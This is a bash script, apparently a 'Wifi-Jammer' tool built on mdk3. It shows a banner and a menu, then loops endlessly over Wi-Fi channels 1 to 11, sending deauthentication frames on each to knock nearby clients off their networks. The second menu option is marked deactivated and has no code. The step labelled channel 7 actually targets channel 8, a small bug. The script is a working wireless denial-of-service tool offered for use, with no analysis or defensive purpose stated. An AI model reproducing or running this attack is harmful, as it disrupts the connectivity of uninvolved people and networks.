#!/bin/bash

red="\e[0;91m"
blue="\e[0;94m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
clear="\e[0m"

clear

#print banner
printf "
${red}
█░█░█ █ █▀▀ █ ▄▄ ░░█ ▄▀█ █▀▄▀█ █▀▀ █▀█
▀▄▀▄▀ █ █▀░ █ ░░ █▄█ █▀█ █░▀░█ ██▄ █▀▄
${clear}
"

printf "${bold}        Powered by mdk3 project${clear}"
echo ""
echo ""
echo ""
printf "${bold}OPTIONS:${clear}"
echo ""
sleep 0.2s
printf "${bold}1.Send deauthentication frame to all channels${clear}"
echo ""
printf "${bold}2.Scan all wireless networks and send deaathentication frame to all them(deactive)${clear}"
echo ""
echo ""
echo ""
read -p "Your selection:" sel

if [ $sel -eq 1 ]; then
    clear
    while true
    do
        echo "Deauth Channel 1..."
        iwconfig $1 channel 1
        timeout 10s mdk3 $1 d -c 1
        clear
        echo "Deauth Channel 2..."
        iwconfig $1 channel 2
        timeout 10s mdk3 $1 d -c 2
        clear
        echo "Deauth Channel 3..."
        iwconfig $1 channel 3
        timeout 10s mdk3 $1 d -c 3
        clear
        echo "Deauth Channel 4..."
        iwconfig $1 channel 4
        timeout 10s mdk3 $1 d -c 4
        clear
        echo "Deauth Channel 5..."
        iwconfig $1 channel 5
        timeout 10s mdk3 $1 d -c 5
        clear
        echo "Deauth Channel 6..."
        iwconfig $1 channel 6
        timeout 10s mdk3 $1 d -c 6
        clear
        echo "Deauth Channel 7..."
        iwconfig $1 channel 7
        timeout 10s mdk3 $1 d -c 8
        clear
        echo "Deauth Channel 8..."
        iwconfig $1 channel 8
        timeout 10s mdk3 $1 d -c 8
        clear
        echo "Deauth Channel 9..."
        iwconfig $1 channel 9
        timeout 10s mdk3 $1 d -c 9
        clear
        echo "Deauth Channel 10..."
        iwconfig $1 channel 10
        timeout 10s mdk3 $1 d -c 10
        clear
        echo "Deauth Channel 11..."
        iwconfig $1 channel 11
        timeout 10s mdk3 $1 d -c 11
        clear
    done
fi
